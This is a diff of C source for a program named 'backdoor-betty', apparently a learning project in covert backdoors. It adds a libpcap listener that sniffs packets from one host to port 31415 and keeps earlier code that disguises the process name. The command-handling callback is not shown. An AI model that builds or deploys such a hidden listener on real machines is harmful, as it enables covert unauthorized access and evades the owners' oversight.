@@ -17,7 +17,6 @@
  *----------------------------------------------------------------------------*/
 
 #include "backdoor-betty.h"
-#include "utils.h"
 #include "pkt_cap.h"
 
 /*-----------------------------------------------------------------------------
@@ -72,7 +71,7 @@ int main(int argc, char *argv[])
 	/* mask the process name */
 	mask_process(argv, PROCESS_NAME);
 
-	sleep(100); /* testing */
+	start_server();
 
 	return ERROR_NONE;
 }
@@ -102,7 +101,6 @@ void print_settings(char *command)
 		fprintf(stderr, "  Running as daemon:   TRUE\n");
 	else
 		fprintf(stderr, "  Running as daemon:   FALSE\n");
-	fprintf(stderr, "  Client's IP Address: %s\n", svr_vars.client_ip);
 }
 
 /*-----------------------------------------------------------------------------
@@ -130,7 +128,6 @@ void print_usage(char *command, int err)
         fprintf(stderr, "usage: %s [arguments]\n\n", command);
         fprintf(stderr, "Arguments:\n");
         fprintf(stderr, "  -d  or  --daemon  Run as a background daemon\n");
-        fprintf(stderr, "  -c  or  --client  Client's IP address\n");
         fprintf(stderr, "  -h  or  --help    Prints out this screen\n");
 		exit(ERROR_OPTS_HELP);
     }
@@ -167,19 +164,18 @@ int parse_options(int argc, char *argv[])
 	static struct option long_options[] =
 	{
 		{"daemon"		, no_argument		, 0, 'd'},
-		{"client"		, required_argument	, 0, 'c'},
 		{"help"			, no_argument		, 0, 'h'},
 		{0, 0, 0, 0}
 	};
 
 	/* set defaults */
 	svr_vars.daemonize = FALSE;
-	svr_vars.client_ip = CLIENT_IP;
-	print_output = FALSE;
+	print_output = TRUE;
+	server = TRUE;
 
 	/* parse options */
 	while (TRUE) {
-		c = getopt_long(argc, argv, "dc:h", long_options, &option_index);
+		c = getopt_long(argc, argv, "d:h", long_options, &option_index);
 
 		if (c == -1)
 			break;
@@ -192,11 +188,7 @@ int parse_options(int argc, char *argv[])
 
 			case 'd':
 				svr_vars.daemonize = TRUE;
-				print_output = TRUE;
-				break;
-
-			case 'c':
-				svr_vars.client_ip = optarg;
+				print_output = FALSE;
 				break;
 
 			case 'h':
@@ -217,19 +209,19 @@ void signal_handler(int sig)
 {
 	switch(sig) {
 		case SIGTERM:
-			if (print_output)
+			if (!svr_vars.daemonize)
 				fprintf(stderr, "Received SIGTERM, terminating.\n");
 			exit_clean();
 		case SIGQUIT:
-			if (print_output)
+			if (!svr_vars.daemonize)
 				fprintf(stderr, "Received SIGQUIT, terminating.\n");
 			exit_clean();
 		case SIGKILL:
-			if (print_output)
+			if (!svr_vars.daemonize)
 				fprintf(stderr, "Received SIGKILL, terminating.\n");
 			exit_clean();
 		case SIGINT:
-			if (print_output)
+			if (!svr_vars.daemonize)
 				fprintf(stderr, "\nReceived SIGINT, terminating.\n");
 			exit_clean();
 		default:
@@ -239,8 +231,7 @@ void signal_handler(int sig)
 
 void exit_clean()
 {
-	/* close sockets etc... */
-	if (print_output)
+	if (!svr_vars.daemonize)
 		fprintf(stderr, "Exited cleanly.\n");
 	exit(ERROR_NONE);
 }
@@ -271,4 +262,77 @@ void mask_process(char *argv[], char *name)
 	memset(argv[0], 0, strlen(argv[0]));
 	strcpy(argv[0], name);
 	prctl(PR_SET_NAME, name, 0, 0);
+}
+
+void start_server()
+{
+	char *dev = NULL;					/* capture device */
+	char err_buff[PCAP_ERRBUF_SIZE];	/* error buffer */
+	pcap_t *handle;						/* packet capture handle */
+	bpf_u_int32 mask;					/* subnet mask */
+	bpf_u_int32 net;					/* ip address */
+
+	char filter_exp[] = "src 192.168.1.101 and dst port 31415";
+	struct bpf_program fp;				/* compiled filter program */
+
+	/* find a capture device */
+	if ((dev = pcap_lookupdev(err_buff)) == NULL) {
+		if (!svr_vars.daemonize)
+			fprintf(stderr, "Could not find default device: %s\n", err_buff);
+		exit(ERROR_PCAP);
+	}
+
+	/* get netmask and IP */
+	if (pcap_lookupnet(dev, &net, &mask, err_buff) == ERROR_GENERAL) {
+		if (!svr_vars.daemonize)
+			fprintf(stderr, "Could not get IP/netmask for device %s: %s\n", dev, err_buff);
+		net = 0;
+		mask = 0;
+	}
+
+	/* print capture info */
+	if (!svr_vars.daemonize) {
+		fprintf(stderr, "Device: %s\n", dev);
+		fprintf(stderr, "Filter expression: %s\n", filter_exp);
+	}
+
+	/* open capture device */
+	if ((handle = pcap_open_live(dev, MAX_PKT_LEN, 1, 1000, err_buff)) == NULL) {
+		if (!svr_vars.daemonize)
+			fprintf(stderr, "Could not open device %s: %s\n", dev, err_buff);
+		exit(ERROR_PCAP);
+	}
+
+	/* make sure we're capturing from an ethernet device */
+	if (pcap_datalink(handle) != DLT_EN10MB) {
+		if (!svr_vars.daemonize)
+			fprintf(stderr, "%s is not an Ethernet device\n", dev);
+		exit(ERROR_PCAP);
+	}
+
+	/* compile the filter expression */
+	if (pcap_compile(handle, &fp, filter_exp, 0, net) == ERROR_GENERAL) {
+		if (!svr_vars.daemonize)
+			fprintf(stderr, "Could not parse expression filter %s: %s\n",
+					filter_exp, pcap_geterr(handle));
+		exit(ERROR_PCAP);
+	}
+
+	/* apply the compiled filter */
+	if (pcap_setfilter(handle, &fp) == ERROR_GENERAL) {
+		if (!svr_vars.daemonize)
+			fprintf(stderr, "Could not install filter %s: %s\n",
+					filter_exp, pcap_geterr(handle));
+		exit(ERROR_PCAP);
+	}
+
+	/* set the callback function */
+	pcap_loop(handle, -1, packet_callback, NULL);
+
+	/* cleanup */
+	pcap_freecode(&fp);
+	pcap_close(handle);
+	
+	if (!svr_vars.daemonize)
+		printf("\nCapture complete.\n");
 }
